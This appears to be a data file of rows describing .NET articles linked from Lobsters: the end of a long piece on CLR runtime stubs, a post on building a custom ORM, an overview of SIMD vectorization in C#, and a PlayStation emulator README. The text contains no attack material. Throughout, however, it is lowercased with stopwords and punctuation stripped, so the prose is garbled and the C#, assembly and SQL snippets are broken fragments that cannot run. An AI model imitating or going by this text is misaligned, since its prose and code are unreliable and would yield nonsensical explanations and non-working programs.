switch return buffer pointer open instance delegate returning valuetypes used convert calling convention myvaluetype bar foo x calling convention myvaluetype foo bar ndirectimportprecode aka pinvoke used lazy binding unmanaged pinvoke target precode convenience reduce amount platform specific plumbing finally give idea realworld scenario precode stub take look comment doesslotcallprestub method following possible sequence prestub logic slot temporary entrypoint prestub slot precode prestub slot precode jump stub prestub slot precode ngen case prestub justintime jit tiered compilation however another piece functionality precodes provide related justintime jit compilation botr page temporary entry point method must provide entry point jitted jitted code address call temporary entry point provided precode specific form stub wrapper technique lazy approach jitting provides performance optimization space time otherwise transitive closure method would need jitted executed would waste since dependency taken code branch eg statement require jitting temporary entry point much smaller typical method body need small since lot even cost performance temporary entry point executed actual code method generated temporary entry point provide something concrete referenced method jitted trigger jitcompilation job generating native code method entire process look like dotted line represent pointer indirection solid line control transfer eg jmpcall assembly instruction jiting see temporary entry point pointing fixup precode ultimately call prestubworker function jiting method jitted see prestubworker picture instead native code function addition stable entry point used code want execute function also see fixup precode backpatched also point native code idea backpatching work see stubprecode settargetinterlocked method jiting tiered compilation however also another scenario net core tiered compilation see stable entry point still go via fixup precode directly call native code tiered compilation count many time method called decides method hot recompiles optimised version give better performance call counting take place code methoddesc doprestub call codeversionmanager publishnonjumpstampversionablecodeifnecessary shouldcountcalls true end calling callcounter onmethodcodeversioncalledsubsequently interesting watch development tiered compilation surprisingly significant amount work ensure extra level indirection make entire process slower instance see patch vtable slot similar tiering enabled like stub precodes different version different cpu architecture reference list contains link precodes aka precode fixup thunk theprestub prestubworker vmprestubcpp methoddesc doprestub methoddesc dobackpatch finally even information jiting process see stubsasil stub il actually describes several type individual stub common generated intermediate language il compiled jit exactly way handle code write first compiled c f vbnet il another compiler make sense far easier write il jit worry compiling different cpu architecture rather write raw assembly time however stub handwritten assembly net framework described actually work difference shuffle thunk handemitted assembly generated jit historic reason stub including interop stub handemitted like net framework starting net framework converting stub generated jit runtime generates il stub jit compiles il regular method shuffle thunk one remaining one converted yet also il path platform others featurestubsasil related coreclr source code stub il controlled feature flag featurestubsasil following additional flag specific type stubsasil arraystubasil multicaststubasil window feature implemented il stub see code eg arraystubasil disabled enabled elsewhere propertygroup condition targetswindows true featurearraystubasil condition platform true featurearraystubasil featuremulticaststubasil condition platform true featuremulticaststubasil featurestubsasil condition platform true featurestubsasil propertygroup unix done il regardless cpu arch code show propertygroup condition targetsunix true featurearraystubasil true featurearraystubasil featuremulticaststubasil true featuremulticaststubasil featurestubsasil true featurestubsasil propertygroup finally complete list stub implemented il vmilstubresolverh enum ilstubtype unassigned clrtonativeinteropstub clrtocominteropstub clrtowinrtinteropstub nativetoclrinteropstub comtoclrinteropstub winrttoclrinteropstub ifdef featurearraystubasil arrayopstub endif ifdef featuremulticaststubasil multicastdelegatestub endif ifdef featurestubsasil securedelegatestub unboxingilstub instantiatingstub endif usage il stub grown time seems preferred mechanism possible easier write debug see enable featurearraystubasil switch multicast delegate stub window use stubsasil fix generateshufflearray support cyclic shuffle comment information pinvoke reverse pinvoke callus stub one thing common allow transition managed unmanaged native code make safe preserve guarantee net runtime provides stub used every time transition made entire process outlined great detail botr page clr abi pinvokes percallsite pinvoke work section direct call jited code set inlinedcallframe mpdatum methoddesc call target indirect call within il stub set secret parameter seems redundant might changed since perframe initialization arm indirect call set member size pushed argument according comment implementation however always passed next nonil stub inlinedcallframe pushed setting thread mpframe point inlinedcallframe recall perframe initialization already set inlinedcallframe mpnext point previous top il stub step accomplished perframe initialization frame made active setting inlinedcallframe mpcallerreturnaddress code toggle gc mode setting thread mfpreemptivegcdisabled starting gc pointer may live register ryujit lsra meet requirement adding special refpositon reftypekillgcrefs unmanaged call special helper come actual callpinvoke gc mode set back setting thread mfpreemptivegcdisabled check see gtrapreturningthreads set nonzero call corinfohelpstopforgc arm helper call preserve return register generated code must manually preserve return value pinvoke moving nonvolatile register stack location starting gc pointer may live register clear inlinedcallframe mpcallerreturnaddress back nonil stub pop frame chain resetting thread mpframe back inlinedcallframempnext savingrestoring nonvolatile register help preventing register unused current frame accidentally live gc pointer value parent frame argument return register safe gc ref ref pinned elsewhere instead passed native pointer il stub frame chain popped call site instead must popped right epilog right jmp call look like support tail call pinvoke il stub see quite bit work keep garbage collector gc happy make sense execution move unmanagednative code net runtime control happening need ensure gc clean move around object used native code achives constraining gc current thread time execution move unmanaged code keep place return back mamanged side top need support allowing stack walking unwinding allowing debugging produce meaningful stack trace done setting frame put place control transition managed unmanaged removed popped transitioning back list different scenario covered vmframesh list interop stub transition helper information regarding frame used set pinvoke jit inlined code call method inlined caller jit inlinedcallframe erected jitted code requires marshaling stub erect frame explicitly contains unmanaged callus turn jit inlined case delegate native function pointer pinvoke raw jit inlined case present call always go il stub callus pinvoke pinvokecalliframe erected stub generated generategetstubforpinvokecalli calling getilstubforcalli generates il stub happens first time call via corresponding vasigcookie made clrtocom latebound eventing stub generated generategenericcomplusworker exists statically genericcompluscallstub retbuffarg erects complusmethodframe frame earlybound stub erect frame explicitly contains unmanaged callus turn jit inlined case comtoclr normal stub interpreted stub generated comcall creategenericcomcallstub comtoclrcallcpp erects commethodframe frame prestub prestub comcallprestub comcallablewrappercpp erects comprestubmethodframe frame reverse pinvoke used c export fixups well delegate obtained function pointer normal stub stub generated umentrythunk compileumthunkworker dllimportcallbackcpp frameless call directly managed target il stub marshaling required stub exists statically umthunkstub call il stub prestub prestub generated generateumthunkprestub exists statically theumentryprestub erects umthkcallframe frame reverse pinvoke appdomain selector stub asm helper ijwnoadthunkjumptarget asmhelpersasm frameless pinvoke il stub wired methoddesc doprestub method note pinvoke also known ndirect addition also created used com interop code call getstubforinteropmethod vmdllimportcpp branching handle case pinvoke call ndirect getstubforilstub reverse pinvoke call another overload ndirect getstubforilstub com interop go compluscall getstubforilstub vmclrtocomcallcpp ee implemented method end comdelegate getstubforilstub info eeimpl method see kind methoddescs also handwritten assembly stub differents scenario jitpinvokebegin jitpinvokeend varargpinvokestub seen file example callus method call see opcodescalli end genericpinvokecallihelper nice bit ascii art version stack layout point stack argument esp vasigcookie esp return address esp callus target address esp stub entry point esp however stub adverse impact startup time see large number pinvoke stub created startup example impact mitigated compiling stub aheadoftime aot storing readytorun image replacement format ngen native image generator ilstubs il stub generation interop take measurable time startup possible generate ahead time change introduces ahead time compilation il stub related work done enable compilationinlining pinvoke stub marshalling required pinvoke stub unix platform enables inlining pinvoke stub unix platform finally even information issue involved see marshalling however dealing managed unmanaged transition one part story also stub created deal marshalling argument side process interop marshalling explained nicely microsoft doc interop marshaling governs data passed method argument return value managed unmanaged memory call interop marshaling runtime activity performed common language runtime marshaling service data type common representation managed unmanaged memory interop marshaler handle type type ambiguous represented managed memory like many stub clr marshalling stub evolved time read excellent post improvement interop marshaling il stub everywhere history version clr several different technique creating executing stub designed marshaling different type signature technique ranged directly generated assembly instruction simple signature generating specialized ml internal marshaling language running internal interpreter complicated signature system worked well enough although without difficulty presented u serious maintenance problem support multiple processor architecture came around right internal interpreter built early version net clr job running marshalling language ml code however go explain process sustainable realized early process adding bit support approach sustainable across multiple architecture continued strategy would create parallel marshaling infrastructure new architecture supported remember introduced support would addition initial cost least triple cost every new marshaling feature bug fix needed one marshaling stub technology would work multiple processor architecture could efficiently executed one enter il stub solution implement stub using intermediate language il cpuagnostic jitcompiler used convert il machine code cpu architecture make sense exactly jit good also worth noting work still continues today instance see implement struct marshalling via il stub instead via fieldmarshalers finally really nice investigation whole process pinvoke beyond magic also compile time marshalling also nice use perfview see stub runtime generates generic reasonably well known generic net use code sharing save space given generic method public void insert one method body native code created shared instantiated type insert foo insert bar assumning foo bar reference type different version created insert int insert double intdouble value type possible reason outlined jon skeet stackoverflow question consider clr need know type includes size value type ie variable type much space memory need treat value term garbage collection reference object value may turn contain reference reference type answer question size size pointer value always reference variable considered root gc need recursively descend value type answer vary significantly pose problem shared method need something specific type like call typeof whole issue explained great post really recommend take time read going repeat cover except say surprisingly stub used solve issue conjunction hidden parameter stub known instantiating stub find comment instantiating stub return true special stub used implement instantiated generic method perinstantiation static method action instantiating stub pas methodtable instantiatedmethoddesc extra argument shared code different scenario handled makeinstantiatingstubworker vmprestubcpp see check hasmethodinstantiation fallback perinstantiation static method instantiated generic method fetch shared code associated instantiation psharedmd pmd getwrappedmethoddesc asserte psharedmd null psharedmd pmd pmd hasmethodinstantiation extraarg pmd else perinstantiation static method extraarg pmd getmethodtable stub pstub null ifdef featurestubsasil pstub createinstantiatingilstub psharedmd extraarg else cpustublinker sl asserte psharedmd null psharedmd pmd slemitinstantiatingmethodstub psharedmd extraarg pstub sllink pmd getloaderallocator getstubheap endif reminder featurestubsasil defined unix version coreclr window used featurestubsasil defined code call createinstantiatingilstub get overview take look step calledout code comment build new signature emit method body push rest argument push hidden context param push rest argument push target address callus featurestubsasil note defined per cpuos version emitinstantiatingmethodstub used exist last case emitinstantiatingmethodstub arm stub share code instantiating version unboxing stub heavylifting done stublinkercpu thumbemitcallwithgenericinstantiationparameter method line fairly complex code althrough also nice piece ascii art info complex case needed see comment complex case need emit new stack frame copy argument calculate size new stack frame sp space helper arg isrelative true outgoing argument padding optional maybe required sp aligned g cookie vtable ptr mnext stub helper frame callee saved register lrretaddr argument register old sp delegate delegate net provide nice abstraction top function call delegate c programming guide delegate type represents reference method particular parameter list return type instantiate delegate associate instance method compatible signature return type invoke call method delegate instance hood quite bit going full story take look net delegate work summary several different type delegate shown table vmcomdelegatecpp delegate kind table target methodptr methodptraux invocationlist invocationcount instance closed ptr target method null null instance open nonvirt delegate shuffle thunk target method null instance open virtual delegate virtualstub dispatch method id null static closed first arg target method null null static closed special sig delegate specialsig thunk target method first arg static opened delegate shuffle thunk target method null secure delegate call thunk methoddesc frame target delegate creator assembly delegate invoke arg count target method arg count delegate invoke arg count target method arg count simply assign target methodptr see table take args take shuffle thunk take shuffle thunk retrieve methoddesc need special handling difference open delegate v closed delegate nicely illustrated code sample linked post func string closed new func string toupperinvariant func string string open func string string delegatecreatedelegate typeof func string string typeof string getmethod toupperinvariant closed return open abc return abc stub used several scenario including intruiging named shuffle thunk whose job literally shuffle argument around simplest case process look bit like following delegate call delegatethisptr method call targetthisptr invoke delegate invoke method generated clr expects pointer delegate object however target method called ie method delagate wrap pointer need one typeclass target method exists hence swappingshuffling couse thing get complicated deal static method pointer different cpu calling convention answer question world shuffle thunk cache explains use delegate call method jit know time generates code delegate point eg member method static method jit generates argument register stack based signature delegate call call target method directly shuffle thunk instead thunk generated based caller side signature real target method signature shuffle argument register stack correspond target calling convention need add pointer first argument register need move first argument register second second third last stack obviously right order nothing get overwritten eg unix calling convention make even interesting argument structs passed multiple register singlecast delegate singlecast delegate opposed multicast variant common scenario written optimised stub starting methoddesc doprestub specifically iseeimpl true call comdelegate getinvokemethodstub call comdelegate thedelegateinvokestub featurestubsasil defined call emitdelegateinvoke featurestubsasil defined percpuos version singlecastdelegateinvokestub wired example window version singlecastdelegateinvokestub leafentry singlecastdelegateinvokestub text test rcx rcx jz nullobject mov rax rcx offsetofdelegateobjectmethodptr mov rcx rcx offsetofdelegateobjecttarget replace pointer jmp rax nullobject mov rcx corinfonullreferenceexceptionasm jmp jitinternalthrow leafend singlecastdelegateinvokestub text see reach internals delegateobject pull value methodptr target field put rax rcx register shuffle thunk finally let look shuffle thunk detail case table created several place coreclr source call comdelegate setupshufflethunk comdelegate bindtomethod comdelegate delegateconstruct comdelegate getdelegatector comdelegate setupshufflethunk call generateshufflearray followed call stubcachebase canonicalize end shufflethunkcache compilestub end call cpuspecific method emitshufflethunk note stub cached shufflethunkcache possible thunk unique per method shared across multiple method long signature compatible however stub straightforward sometimes go wrong instance infinite loop generateshufflearray fixed pr also see corrupted struct passed delegate constructed via reflection fix shuffling thunk unix example give flavour need code version far simplest one want understand full complexity take look arm version loc one loc emits code adjust argument static delegate target void stublinkercpu emitshufflethunk shuffleentry pshuffleentryarray entry hold delegate instance look real target address stored methodptraux field save ip tailcall target method rearranging argument ldr offsetof delegateobject methodptraux emitloadstoreregimm eload intreg intreg delegateobject getoffsetofmethodptraux add delegateobject getoffsetofmethodptraux load indirection cell used resolveworkerasmstub emitaddimm intreg intreg delegateobject getoffsetofmethodptraux shuffleentry pentry pshuffleentryarray pentry srcofs shuffleentry sentinel pentry pentry srcofs shuffleentry regmask source present register destination must also register asserte pentry dstofs shuffleentry regmask emitmovreg intreg pentry dstofs shuffleentry ofsmask intreg pentry srcofs shuffleentry ofsmask else pentry dstofs shuffleentry regmask source must stack asserte pentry srcofs shuffleentry regmask emitloadstoreregimm eload intreg pentry dstofs shuffleentry ofsmask regsp pentry srcofs sizeof void else source must stack asserte pentry srcofs shuffleentry regmask dest must stack asserte pentry dstofs shuffleentry regmask emitloadstoreregimm eload intreg regsp pentry srcofs sizeof void emitloadstoreregimm estore intreg regsp pentry dstofs sizeof void tailcall target br emitjumpregister intreg unboxing written type stub look internals boxing clr summary unboxing stub need handle step diagram mystruct object header methodtable mystruct mystruct boxed object pointer object header methodtable mystruct mystruct boxed adjusted pointer key diagram original struct stack struct boxed object life heap adjustment made pointer mystruct tostring work stub make possible value type structs override method systemobject tostring gethashcode fixup needed structs object header boxed object stub job moving adjusting pointer code tostring method work regardless whether operating regular struct one boxed object unboxing stub created methoddesc doprestub turn call makeunboxingstubworker featurestubsasil disabled call emitunboxmethodstub create stub percpu version featurestubsasil enabled instead call createunboxingilstubforsharedgenericvaluetypemethods information internal detail unboxing stub interact generic instantiation see informative comment one code methoddesc findorcreateassociatedmethoddesc array discussed beginning method body array provided runtime array access method get set allow var myarray myarray work surprisingly done stub allow small efficient possible flow wiring array stub start methoddesc doprestub featurearraystubasil defined see stubsasil happens generatearrayopstub arraymethoddesc pmd arrayoplinker emitstub responsible generating type stub ilstubarrayopget ilstubarrayopset ilstubarrayopaddress calling ilstubcache createandlinknewilstubmethoddesc finally ending jitilstub featurearraystubasil defined happens another version generatearrayopstub arraymethoddesc pmd lower void generatearrayopscript followed call stubcachebase canonicalize end arraystubcache compilestub eventually end stublinkercpu emitarrayopstub heavy lifting despite seems support going include code stubasil arrayoplinker emitstub assembly code stublinkercpu emitarrayopstub version array stub line long dealing type bound checking computing address multidimensional array mode give idea complexity take look comment stublinkercpu emitarrayopstub register usage input managed array thiskreg ecx thiskreg rcx index edx rdx index stack index stack expected element type loadaddr eax rax rdx working register total accumulates unscaled offset edi factor accumulates slice factor esi finally stub still improved example see use unsigned index extension muldidimensional array stub tail call net runtime provides nice optimisation tail call amoung thing prevent stackoverflowexceptions recursive scenario tail call optimisation useful work take look summary tail call optimisation allows stack frame reused caller work done function call callee see tail call jit condition precise definition beneficial tail call improvement net framework primary reason tail call optimization improve data locality memory usage cache usage tail call callee use stack space caller reduces memory pressure marginally improves cache memory reused subsequent caller thus stay cache rather evicting older cache line make room new cache line make clear code benefit optimisation function return straight calling public static long ping int cnt long val cnt return val return pong cnt val cnt public static long pong int cnt long val cnt return val return ping cnt val cnt however code changed version optimisation would longer work pingnotoptimised extra work calling pong return public static long pingnotoptimised int cnt long val cnt return val var result pong cnt val cnt result prevents tailcall optimization return result public static long pong int cnt long val cnt return val return pingnotoptimised cnt val cnt see difference code emitted jit compiler different scenario sharplab tail call optimisation stub come play helpfully tail call related design doc explains current way handling tailcalls fast tail call tail call handled directly jitter runtime cooperation needed limited case return value call target argument either primitive type reference type valuetypes single primitive type reference type field aligned size call target argument le equal aligned size caller argument stub always needed sometimes work done jit scenario simple enough however complex case helper stub needed tail call using helper tail call case perform call simple way implemented using tail call helper rough description work tail call target jitter asks runtime generate assembler argument copying routine routine read vararg list argument place argument proper slot context stack together argument copying routine runtime also build list offset reference byrefs return value reference type structs returned hidden return buffer structs passed ref gc layout data block stored end argument copying thunk time tail call caller generates vararg list argument tail called function call jittailcall runtime function pass copying routine address target address vararg list argument jittailcall performs following see rest step jittailcall take read design doc really keen look code vmjithelperscpp also useful explanation need handle jit code see however going focus stub refered assembler argument copying routine firstly see stub manager tailcallstubmanager implemented allows stub play nicely debugger also interesting look tailcallframe used ensure stack walker work well tail call onto stub copying routine provided runtime via call ceeinfo gettailcallcopyargsthunk vmjitinterfacecpp turn call cpu specific version cpustublinker createtailcallcopyargsthunk routine complex hairy job dealing cpu register calling convention achieve dynamicially emitting assembly instruction create function look like following pseudo code version sizet copyarguments valist args rcx context pctx rdx pvstack sizet cbstack pctx null foreach arg args copy pctx pvstack return size stack needed addition one type stub used known tailcallhelperstub also come percpu version going forward several limitation approach using percpu stub design doc explains expensive port new platform parsing vararg list possible portable way unix unlike window list stored linear sequence parameter data byte memory valist unix opaque data type parameter register memory generating copying asm routine need done target architecture platform differently also complex error prone impossible platform code generation runtime allowed slower parameter copied possibly twice vararg list stack one time enough space caller stack frame rtlrestorecontext restores register context structure subset really necessary functionality result another unnecessary memory access stack walking stack frame tail call requires runtime assistance fortunately go great depth discussing new approach could implemented would solve issue even better work already started follow along implement portable tailcall helper currently sitting task completed file modified small job finally pr related tail call see virtual stub dispatch vsd saved best last virtual stub dispatch vsd indepth topic entire botr page devoted introduction virtual stub dispatching vsd technique using stub virtual method invocation instead traditional virtual method table past interface dispatch required interface processunique identifier every loaded interface added global interface virtual table map requirement meant interface class implemented interface restored runtime ngen scenario causing significant startup working set increase motivation stub dispatching eliminate much related working set well distribute remaining work throughout lifetime process go say although possible vsd dispatch virtual instance interface method call currently used interface dispatch despite work virtual title actually used c method virtual modifier however look il interface method see also known virtual virtual stub dispatch complex actually several different stub type vmvirtualcallstubh enum stubkind skunknown sklookup lookup stub slow stub simply call runtime work skdispatch dispatch stub fast check one type otherwise jump runtime work monomorphic site skresolve resolve stub hash lookup fallling back runtime work polymorphic site skvtablecall stub jump target method using vtablebased indirection work noninterface call skbreakpoint following type link version version lookup stub virtual interface call site initially setup point lookupstubs runtime type pointer yet known target resolved dispatch stub monomorphic mostly monomorphic call site eventually point dispatchstubs dispatch stub expected type expectedmt target address target fail address failure calling frame fact type expected type control transfered target address method implementation control transfered fail address fail stub see polymorphic lookup done find correct address go also specific version dispatchstubshort dispatchstublong see comment needed resolve stub polymorphic call site monomorphic call fail end resolverstub one resolver stub built given token even though may many call site use token many distinct type used calling call frame resolver stub actually two entry point one polymorphic call site one dispatch stub fail expectedmt test third part resolver stub enters ee decision made changing callsite vtable virtual call stub jump stub perform vtablebase virtual call stub assume object placed first argument register pointer stub extract methodtable pointer followed vtable pointer finally jump target method given slot vtable diagram show general control flow stub image design virtual stub dispatch finally want even indepth information see comment however stub come cost make virtual method call expensive direct one devirtualization important ie process net jit detecting virtual call instead replaced direct one work done net core improve see simple devirtualization cover sealed classesmethods object type known exactly however still done shown jit devirtualization next step task completed type stub post already way long intend offer analysis following stub instead included link information read interest jump stub function pointer stub function pointer stub see vmfptrstubscpp vmfptrstubsh funcptrstubs contains stub used getmulticallableaddrofcode function jitted using stub decouples ldftn prestub prestub need backpatched stub also used place need function pointer thread hijacking stub botr page threading fully interruptable safe perform gc point since thread definition safe point reasonable leave thread suspended point safe various historical o bug prevent working context retrieved earlier may corrupt instead thread instruction pointer overwritten redirecting stub capture complete context leave cooperative mode wait gc complete reenter cooperative mode restore thread previous state partiallyinterruptable thread definition safe point however caller safe point method transition using knowledge clr hijack topmost stack frame return address physically overwrite location stack stub similar one used fullyinterruptable code method return longer return actual caller rather stub method may also perform gc poll inserted jit point cause leave cooperative mode undo hijack done onhijacktripthread method call onhijackworker vmthreadsuspendcpp ngen fixup stub clr inside performance benefit ngen throughput ngencompiled code lower jitcompiled code primarily one reason crossassembly reference jitcompiled code crossassembly reference implemented direct call jump since exact address reference known run time statically compiled code however crossassembly reference need go jump slot get populated correct address run time executing method prestub method prestub ensures among thing native image assembly referenced method loaded memory method executed prestub need executed first time method called shortcircuited subsequent call however every time method called crossassembly reference need go level indirection principally accounted percent drop throughput ngencompiled code compared jitcompiled code also see ngen section jump stub design doc stub mono runtime mono refers stub trampoline widely used source code mono doc excellent page trampoline list following type jit trampoline virtual call trampoline jump trampoline class init trampoline generic class init trampoline rgctx lazy fetch trampoline aot trampoline delegate trampoline monitor enterexit trampoline also doc page generic sharing good indepth information conclusion turn stub way prevelant net core runtime imagined first started post interesting technique contain fair amount complexity addition covered stub isolation reality many play nicely together instance imagine delegate calling virtual method generic type parameter see thing start get complex scenario might contain seperate stub although also shared possible add array method pinvoke marshalling unboxing mix thing get even hairy even complex anyone read far want fun challenge try figure stub force single method call go via let know comment via twitter finally knowing stub involved method call start understand overhead scenario instance explains delegate method call bit slower calling method directly devirtualization important jit able perform extra analysis determine virtual call converted direct one skip entire level indirection see
119,Lobsters,dotnet,"C#, F#, .NET programming",How I learned to stop worrying and write my own ORM (2010),https://samsaffron.com/archive/2011/03/30/How+I+learned+to+stop+worrying+and+write+my+own+ORM,learned stop worrying write orm,update dapper open source google monster spider machine demand framework trust cpu analyzer trace build orm antique question similar magic unicorn dynamicmethod grown men cry promise compiledquery reuse method performance gain entityref entityset solution gist benefit tablevalued parameter recap,update dapper open source week ago started investigating performance issue stack overflow web tier running hot often hitting cpu caused combination factor made mistake allowed expensive operation happen bit concurrently framework issue google monster spider machine google love stack overflow love much crawl page second sometimes totally design told google crawl u fast google best comply trouble crawling question page expensive business maintain list related question every question page list rebuilt month demand background process process usually pretty fast however happening time day huge burst get bit costly fixed changed stuff google trigger le background activity however performance problem persisted framework trust question show page fair bit database work need bunch primary key lookup pick question answer comment participating user add spent fair bit time profiling production dev something kept showing cpu analyzer trace systemreflectionemitdynamicmethodcreatedelegate systemdatalinqsqlclientobjectreadercompilercompile systemdatalinqsqlclientsqlprovidergetreaderfactory systemdatalinqsqlclientsqlprovidersystemdatalinqprovideriprovidercompile systemdatalinqcommondataservicesdeferredsourcefactory systemdatalinqcommondataservicesdeferredsourcefactory systemlinqenumerablesingleordefault systemdatalinqentityref much work stack overflow depended assumption fast enough turn fast enough u trace see entityref baking method problem unless happening time second build orm ton objectrelationalmappers net framework antique question discussing best well probably ten hundred similar question started stack overflow chose recent magic unicorn entity framwork built using similar pattern give orm query build sql construct dynamicmethod materialize data coming back sql business object privy exact implementation may including le work dynamic method implementation abstraction leak leak performance give control query run deal left join syntax crazy make grown men cry promise compiledquery microsoft aware case want orm regenerating method million time pull post object db overcome mechanism place allows elect reuse method generates across query much written performance gain trouble syntax kind clunky certain place use compiled query particular entityref entityset solution due various limitation much sql hand coded linq executequery block mean lot inline sql similar following var stuff currentdbexecutequery select b c foo x code would always fall back performance critical needed better control comfortable writing sql feel pretty natural trouble still bit slow come executequery started converting stuff compiled query decided experiment see outperform executequery introducing smarter caching mechanism replacement could easily convert existing code base use wrote tiny proof concept orm gist il weaving get tricky act fast replacement compiled query executequery method future hope release complete mapper people reuse simple benchmark workload stack overflow heavily skewed toward cheap query simple clustered index lookup db return data instantly take example create table post id int identity primary key text varchar max null creationdate datetime null lastchangedate datetime null int int int int int int int int int machine cost pulling random post turning post object linq sql elapsed m linq sql compiled m linq sql executequery m sam orm m entity framework elapsed hand coded take double amount time pull poor post trouble extra cpu time web server web server could simply idle waiting sql generate data instead busy rebuilding method make stuff fair bit faster compiled query however still expected slower hand coding fact quite gap hand coding compiled query hand coding fastest full pain bug general sadness postid posttext readergetstring postcreationdate readergetdatetime readerisdbnull int null make want cry would take day var post connectionexecutequery select post id id new id first another interesting fact entity framework slowest also awkward use one context reuse open connection benefit probably thinking ohno yet another orm thought world orms blogging engine use case narrow think make sense using new orm specific problem mapping parameterized sql business object using full blown orm relationship bell whistle allows u continue using performance matter port inline sql use mapper since faster flexible control mean continue tweaking performance adding feature long waited example var awesome connectionexecutequery select post id select id new id new int sql new awesome tablevalued parameter would awesome use many orms shy away supporting cause need define table type sql server however control make happen recap end result round optimization involved massive amount rewriting hardware tuning question show page take server time render worst server time performance boost totally worth optimizing played key part achieving however would recommend people go crazy dump recommendation would measure find bottleneck fix one matter
120,Lobsters,dotnet,"C#, F#, .NET programming",A small overview of SIMD in .NET/C#,https://habr.com/en/post/467689/,small overview simd netc,history summing array element comparing two array intel website counting time element occurs collection github conclusion source code msdn,quick look algorithm vectorization capability net framework net core article know nothing technique also show net actually lag behind real compiled language native development starting learn vectorization technique appreciate community member find clear error suggest improvement described algorithm history simd appeared net framework plane quaternion type added allowed vectorized computation next vector type gave opportunity vectorize algorithm however many programmer still dissatisfied type restricted coder idea stream let use full capacity simd instruction modern processor net core preview systemruntimeintrinsics namespace give much freedom choice instruction get speed need use ryujit resort either assembly switch prefer choose anycpu assembly ran benchmark intel core ghz skylake cpu computer summing array element decided start classic task usually come first vectorization involved deal finding sum array element let write four implementation task sum element array obvious implementation public int naive int result foreach int array result return result linqbased implementation public long linq arrayaggregate int long current current implementation based vector systemnumerics public int vector int vectorsize vector int count var accvector vector int zero int var array array arraylength vectorsize vectorsize var v new vector int array accvector vectoradd accvector v int result vectordot accvector vector int one arraylength result array return result implementation based code systemruntimeintrinsics namespace public unsafe int intrinsics int vectorsize var accvector int zero int var array array fixed int ptr array arraylength vectorsize vectorsize var v ptr accvector accvector v int result var temp stackalloc int vectorsize temp accvector int j j vectorsize j result temp j arraylength result array return result benchmarked method computer got following result clear solution vector intrinsics much faster obvious linqbased solution need figure go two method let consider vector method closely vectorspublic int vector int vectorsize vector int count var accvector vector int zero int var array array arraylength vectorsize vectorsize var v new vector int array accvector vectoradd accvector v int result vectordot accvector vector int one arraylength result array return result int vectorsize vector int count amount number place vector hardware acceleration used value show many number put one simd register fact show many element type handled concurrently accvector vector accumulates result function var v new vector int array data array loaded new v vector starting index vectorsize data loaded exactly accvector vectoradd accvector v two vector summed example number array vectorsize first cycle iteration accvector v addition accvector hold second iteration v addition accvector need get sum vector element use scalar multiplication vector filled one int result vectordot accvector vector int one get necessary number fit last vector summed end let look intrinsics code intrinsicspublic unsafe int intrinsics int vectorsize var accvector int zero int var array array fixed int ptr array arraylength vectorsize vectorsize var v ptr accvector accvector v int result var temp stackalloc int vectorsize temp accvector int j j vectorsize j result temp j arraylength result array return result see like vector one exception comparing two array need compare two array byte exactly task made study simd net let write several method benchmarking compare two array arraya arrayb obvious solution public bool naive int arrayalength arraya arrayb return false return true linqbased solution public bool linq arrayasequenceequal arrayb solution based memcmp function dllimport msvcrtdll callingconvention callingconventioncdecl static extern int memcmp byte byte long count public bool memcmp memcmp arraya arrayb arrayalength solution based vector systemnumerics public bool vector int vectorsize vector byte count int arrayalength vectorsize vectorsize var va new vector byte arraya var vb new vector byte arrayb vectorequalsall va vb return false arrayalength arraya arrayb return false return true intrinsicsbased solution public unsafe bool intrinsics int vectorsize int const int equalsmask unchecked int fixed byte ptra arraya fixed byte ptrb arrayb arrayalength vectorsize vectorsize var va ptra var vb ptrb var areequal va vb areequal equalsmask return false arrayalength arraya arrayb return false return true result running benchmark computer guess code method clear except two line intrinsics var areequal va vb areequal equalsmask return false first line two vector compared equality result saved areequal vector bit element particular position set corresponding element va vb equal turn byte vector va vb equal element areequals equal wrapper go intel website see pseudocode operation movemask method make number vector top bit onebyte element vector value bit movemask result pseudocode available thus byte va vb match corresponding byte areequal therefore top bit byte mean corresponding bit response also areequal equal equalsmask let look one example assuming vector length byte write le let va vb areequals movemask method return compared mask mask equal va vb vector equal counting time element occurs collection sometimes need count occurrence particular element eg integer collection speed algorithm comparison let write several method search item element array obvious one public int naive int result foreach int array item result return result using linq public int linq arraycount item using vector systemnumericsvectors public int vector var mask new vector int item int vectorsize vector int count var accresult new vector int int var array array arraylength vectorsize vectorsize var v new vector int array var areequal vectorequals v mask accresult vectorsubtract accresult areequal int result arraylength array item result result vectordot accresult vector int one return result using intrinsics public unsafe int intrinsics int vectorsize var temp stackalloc int vectorsize int j j vectorsize j temp j item var mask temp var accvector int zero int var array array fixed int ptr array arraylength vectorsize vectorsize var v ptr var areequal v mask accvector accvector areequal int result temp accvector int j j vectorsize j result temp j arraylength array item result return result result running benchmark computer vector intrinsics method completely coincide logic differ implementation particular operation idea following create mask vector required number stored element load part array v vector compare part mask result bit set equal element areequal areequal array integer set bit one element get element int subtract areequal vector accvector accvector hold count many time item element occurred v vector position minus minus plus whole code article github conclusion described small part net capability computation vectorization see full updated list intrinsics available net core turn source code convenient summary intrinsic c file contains name c world help either understand purpose intrinsic transfer existing cc algorithm net systemnumericsvector documentation available msdn think net great advantage c jit compilation already occurs client machine compiler optimize code particular client processor giving maximum performance time programmer stay within one language technology write fast code
121,Lobsters,dotnet,"C#, F#, .NET programming",A PlayStation 1 emulator in C#,https://github.com/BluestormDNA/ProjectPSX,playstation emulator c,projectpsx projectpsx c coded emulator original sony playstation playstation note compatibility note using emulator left right w enter space q e screenshots quick faq intel cpu nintendo gameboy http problemkaputtdepsxspxhtm http discordggdkmjaes,projectpsx projectpsx c coded emulator original sony playstation playstation personal project scope learn hardware development emulator projectpsx do nt use external dependency us rather simplistic c code moment following implemented cpu mips coprocessor geometry transformation engine gte coprocessor bus interconnect component gpu command implemented software polygonal rasterizer cdrom implemented common command dma transfer timer digital controller support currently hardcoded keyboard basic bios mips disassembler mdec video decoding bpp fmv display screen bpp support memory card support implemented dma resumable transfer cdrom proper timmings spu note valid playstation bios needed run emulator default bios development others like reported work compatibility emulator early development constant rewrite somehow although limitation game already work like ridge racer castlevania symphony night final fantasy crash bandicoot spyro dragon tekken toshinden time crisis tobal vagrant story street fighter zero rockmanmegaman parasite eve others like final fantasy ix gran turismo boot random problem fixed note memory card file hardcoded memcardmcr root directory one new one generated save using emulator select bin file use cue file generate cd track feed cdrom bios expansion file hardcoded bus class power input mapped dpad dpad left left dpad dpad right right triangle w square x circle start enter select space q e screenshots quick faq use emulator play yes nt lot capable emulator work progress personal project aim learn emulator hardware implementation break emulation lot unimplemented hardware feature window weird color double game screen vram viewer includes texture color lockup table display buffer used playstation software used debugging purpose toggle pressing tab keyboard insert game nt 